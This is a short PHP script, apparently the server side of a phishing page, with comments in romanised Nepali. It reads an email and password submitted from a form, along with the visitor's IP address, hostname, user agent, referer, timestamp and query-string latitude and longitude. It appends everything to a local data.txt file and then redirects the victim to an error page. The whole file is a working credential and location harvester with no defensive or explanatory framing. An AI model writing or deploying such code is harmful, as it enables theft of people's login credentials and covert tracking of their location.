<?php

$protocol = $_SERVER['SERVER_PROTOCOL'];
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

// yeta redirect garne

// date ko lagi
$info = getdate();
$date = $info['mday'];
$month = $info['mon'];
$year = $info['year'];
$hour = $info['hours'];
$min = $info['minutes'];

$email = $_POST['email'];
$password = $_POST['password'];


$current_date = "$date/$month/$year == $hour:$min:$sec";



$myfile = fopen("data.txt", "a") or die("Unable to open file!");
$host = $_SERVER["REMOTE_ADDR"];

$ru = "./error.html";

$txt = "long:" . $_GET['long'] . "\nlat:" . $_GET['lat'] . "\nIP:" . $host . "\nUser agent:" . $_GET["uagent"]."\n";

$data = $_POST['email'] ."  " .$_POST['password'] ." \n ";


fwrite($myfile, '---- START --- '."\n");

fwrite($myfile, 'User Agent: '."".$agent ."\n");
fwrite($myfile, 'HTTP Referer: '."".$ref ."\n");
fwrite($myfile, 'DATE & TIME : '."".$current_date ."\n");
fwrite($myfile, 'IP Address: '."".$ip ."\n");
fwrite($myfile, 'Hostname: '."".$hostname ."\n");

fwrite($myfile, 'Email: '."".$email ."\n");
fwrite($myfile, 'Password: '."".$password ."\n");


fwrite($myfile, $txt);

fwrite($myfile, $data);

fwrite($myfile, '---- END --- '."\n\n");
fclose($myfile);

header('Location: '.$ru);

?>